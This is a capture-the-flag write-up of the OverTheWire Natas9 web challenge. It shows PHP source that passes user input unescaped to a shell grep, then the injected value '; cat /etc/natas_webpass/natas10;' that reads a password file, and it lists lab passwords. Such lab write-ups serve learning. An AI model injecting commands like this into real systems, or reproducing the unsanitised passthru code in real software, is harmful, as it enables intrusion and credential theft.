# CTF Writeup - **OverTheWire Natas7 - Natas8**

**Author**: spiketyson 

---

## Challenge Details

- **Challenge Name:** Natas8 - Natas9
- **Category:** Linux
- **Difficulty Level:** Easy
- **Date:** 3-12-2024

---

## Summary

This challenge is the introductory level for the Natas series on OverTheWire, focusing on web exploitation. The goal is to find the flag that is hidden web server using burpsuite if possible.

---

## Approach

Since this is an basic challenge, I planned to use inspect element to troubleshoot and find the flag.

---

## Solution Walkthrough

Connecting to the web server using:

```bash
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL:      http://natas9.natas.labs.overthewire.org
```

After logging in, we can see that the webpage asks for Input word.  But we dont know anything about it, So lets input some random value and check it out. 

```bash
Find words containing: a
# Submit
# African
# Africans
# Allah
# Allah's
# American
# Americanism
# Americanism's
# Americanisms
```

It shows us all the words that have `a` in it. Since, we dont know how it works and how to get the password. Lets view the source code of the it.

```bash
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
# <body>
# <h1>natas9</h1>
# <div id="content">
# <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# <?
# $key = "";
# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }
# if($key != "") {
#     passthru("grep -i $key dictionary.txt");
# }
# ?>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

We can see that there is a form which takes our input, and when we submit the input there is a php code which gets executed on the input, Where the code takes our input which is tagged with `needle` in the html and is copied to the `key` variable. Then it check if the key is not NULL value, if not then it does a grep of the keyword that we have given on a text file. This is interesting for us because we know that the password is in `/etc/natas_webpass/natas10` we can input another cli to be executed instead of grep as the input is not checked here as shown below. 
 
```bash
; cat /etc/natas_webpass/natas10; 
# t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

So what we did here is that we know that if we want to execute multiple commands in linux cli we can use `;` which is considered as the end of the command. We can use the same here to end the grep and do another command. So what essentially happens is that the php code is replacing our input `; cat /etc/natas_webpass/natas10 ;` in the command. The final command looks like `grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt`. Here is grep is not fully finished so it is ignored adn the dictionary.txt is also ignored as there is no command for the file, only the middle part is executed. We got the password for the next level.


## Flag

**Flag:** t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

---

## Lessons Learned

It was a good challenge where i learned about how i can give proper inputs to exploit bugs.
